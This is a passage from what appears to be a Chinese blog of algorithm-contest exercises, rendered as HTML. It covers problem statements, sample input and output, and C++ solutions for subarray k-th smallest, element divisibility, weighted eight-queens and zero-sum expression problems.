2</span><br></pre></td></tr></table></figure><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100010</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100010</span>],p[<span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;n&gt;&gt;q;</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="comment">//cin&gt;&gt;a;</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=a[i]-<span class="string">'a'</span>+<span class="number">1</span>;j&lt;<span class="number">26</span>;j++)</span><br><span class="line">            ans[i]=<span class="built_in">max</span>(ans[i],p[j]+<span class="number">1</span>);</span><br><span class="line">        p[a[i]-<span class="string">'a'</span>]=ans[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">while</span>(q--)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>,ans[x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x09-区间第K小"><a href="#0x09-区间第K小" class="headerlink" title="0x09 区间第K小"></a>0x09 区间第K小</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。</p><p>例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。</p><h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><p>第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述</p><p>第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9)</p><p>数据保证数列b中的元素个数不少于k个</p><h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><p>输出一个数，表示数列b中的第k小的数</p><h3 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">5 3 4 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9</span><br></pre></td></tr></table></figure><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//没看懂</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">max_position</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;             </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">-1</span>, num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (r &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; k)                   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[r + <span class="number">1</span>] &lt;= x)num++;</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result += n - r;</span><br><span class="line">            <span class="keyword">if</span> (a[l] &lt;= x)num--;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">int</span>*b=<span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        b[i] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b, b + n);</span><br><span class="line">    <span class="keyword">int</span> len = unique(b, b + n) - b;    </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = len - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ret = max_position(b[mid]);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= k)        </span><br><span class="line">        &#123;</span><br><span class="line">            ans = b[mid];</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0A-元素整除问题"><a href="#0x0A-元素整除问题" class="headerlink" title="0x0A 元素整除问题"></a>0x0A 元素整除问题</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。</p><h3 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h3><p>输入20个整数</p><h3 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h3><p>按输入顺序输出符合要求的数字，每行输出一个整数。</p><h3 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21</span><br></pre></td></tr></table></figure><h3 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>],b[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        b[i]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b,b+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;b[i]&lt;" ";</span></span><br><span class="line">        <span class="keyword">int</span> sign=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">20</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j]&lt;a[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]%b[j]==<span class="number">0</span>)</span><br><span class="line">                    sign=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sign==<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0B-八皇后问题"><a href="#0x0B-八皇后问题" class="headerlink" title="0x0B 八皇后问题"></a>0x0B 八皇后问题</h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><p>努比亚和苏丹没有子女，所以他要从一些有集成资格的继承者中挑选一个出来继承王位。他希望这个继承者足够聪明，所以他准备了一个西洋棋盘，上面的每个格子中均有一个 1-99 的数字。他又准备了 8 个皇后棋子。</p><p>8 皇后的规则就是不能有任何棋子同行或者同列或者同斜线，在满足这个规则的同时，王位继承者还需要让 8 个皇后所在的位置的数字的和是最大的。</p><h3 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h3><p>输入一个数字 k(<em>k<strong>≤</strong>20</em>)，代表棋盘的数量。</p><p>接下来有 k 个棋盘，每个棋盘有 64 个数字，分成 8 行 8 列输入，具体可见样例，每一个数字均小于 100。</p><h3 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h3><p>每一个棋盘对应输出最大的数值， 一共输出 k行</p><h3 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1 2 3 4 5 6 7 8</span><br><span class="line">9 10 11 12 13 14 15 16</span><br><span class="line">17 18 19 20 21 22 23 24</span><br><span class="line">25 26 27 28 29 30 31 32</span><br><span class="line">33 34 35 36 37 38 39 40</span><br><span class="line">41 42 43 44 45 46 47 48</span><br><span class="line">48 50 51 52 53 54 55 56</span><br><span class="line">57 58 59 60 61 62 63 64</span><br></pre></td></tr></table></figure><h3 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">260</span><br></pre></td></tr></table></figure><h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">8</span>][<span class="number">8</span>],x[<span class="number">8</span>],ans,sum;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xx; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yy == x[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(xx - i) == <span class="built_in">abs</span>(yy - x[i])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queen</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">8</span>)&#123;ans = <span class="built_in">max</span>(ans,sum);<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(check(n,i))</span><br><span class="line">        &#123;</span><br><span class="line">            x[n] = i;</span><br><span class="line">            sum += <span class="built_in">map</span>[n][i];</span><br><span class="line">            queen(n+<span class="number">1</span>);</span><br><span class="line">            x[n] = <span class="number">-1</span>;</span><br><span class="line">            sum -= <span class="built_in">map</span>[n][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">map</span>[i][j]);</span><br><span class="line">        <span class="built_in">memset</span>(x,<span class="number">-1</span>,<span class="keyword">sizeof</span>(x));</span><br><span class="line">        queen(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0C-组合运算式"><a href="#0x0C-组合运算式" class="headerlink" title="0x0C 组合运算式"></a>0x0C 组合运算式</h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><p>请考虑一个被空格分隔的，由1到N的整数组成的递增数列：<em>1 2 3 …N<em>。现在请在数列中插入表示加的“+”，或者表示减“-”，亦或者表示空白的“ ”(例如</em>1-2 3<em>就等于</em>1-23</em>)，来将每一对数字组合成一个表达式（第一个数字前无空格）。计算该表达式的结果并判断其值是否为0。请你写一个程序找出所有产生和为零的长度为N的数列。</p><h3 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h3><p>输入为一行，包含一个整数N，<em>3*</em>≤<strong>N</strong>≤*<em>9</em>。</p><h3 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h3><p>输出为所有在每对数字间插入“+”, “-”, 或 “ ”后能得到和为零的数列，并按照字典（ASCII码）序排列。</p><h3 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><h3 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1+2-3+4-5-6+7</span><br><span class="line">1+2-3-4+5+6-7</span><br><span class="line">1-2 3+4+5+6+7</span><br><span class="line">1-2 3-4 5+6 7</span><br><span class="line">1-2+3+4-5+6-7</span><br><span class="line">1-2-3-4-5+6+7</span><br></pre></td></tr></table></figure><h3 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> OP[<span class="number">15</span>] = &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> d,<span class="keyword">int</span> sum,<span class="keyword">int</span> pre,<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sum += pre;</span><br><span class="line">    <span class="keyword">if</span>(d == n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!sum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!OP[i]) <span class="built_in">printf</span>(<span class="string">" %d"</span>,i);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(OP[i] == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">"+%d"</span>,i);</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"-%d"</span>,i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s&lt;=<span class="number">3</span>)&#123;</span><br><span class="line">        OP[d+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pre &gt;= <span class="number">0</span>) dfs(d+<span class="number">1</span>,sum-pre,pre*<span class="number">10</span>+d+<span class="number">1</span>,s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> dfs(d+<span class="number">1</span>,sum-pre,pre*<span class="number">10</span>-d<span class="number">-1</span>,s+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    OP[d+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dfs(d+<span class="number">1</span>,sum,d+<span class="number">1</span>,s);</span><br><span class="line">    OP[d+<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">    dfs(d+<span class="number">1</span>,sum,-d<span class="number">-1</span>,s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    dfs(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0D-无脑博士的试管们"><a href="#0x0D-无脑博士的试管们" class="headerlink" title="0x0D 无脑博士的试管们"></a>0x0D 无脑博士的试管们</h2><h3 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h3><p>无脑博士有三个容量分别是 A,B,C 升的试管，A,B,C分别是三个从 1到 20的整数，最初，A 和 B 试管都是空的，而 C 试管是装满硫酸铜溶液的。有时，无脑博士把硫酸铜溶液从一个试管倒到另一个试管中，直到被灌试管装满或原试管空了。当然每一次灌注都是完全的。由于无脑博士天天这么折腾，早已熟练，溶液在倒的过程中不会有丢失。</p><p>写一个程序去帮助无脑博士找出当 A 试管是空的时候，C 试管中硫酸铜溶液所剩量的所有可能性。</p><h3 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例，对于每组测试用例，输入包括一行，为空格分隔开的三个数，分别为整数 A,B,C。</p><h3 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h3><p>输出包括一行，升序地列出当 A 试管是空的时候，C 试管溶液所剩量的所有可能性。</p><h3 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 5 10</span><br></pre></td></tr></table></figure><h3 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 6 7 8 9 10</span><br></pre></td></tr></table></figure><h3 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 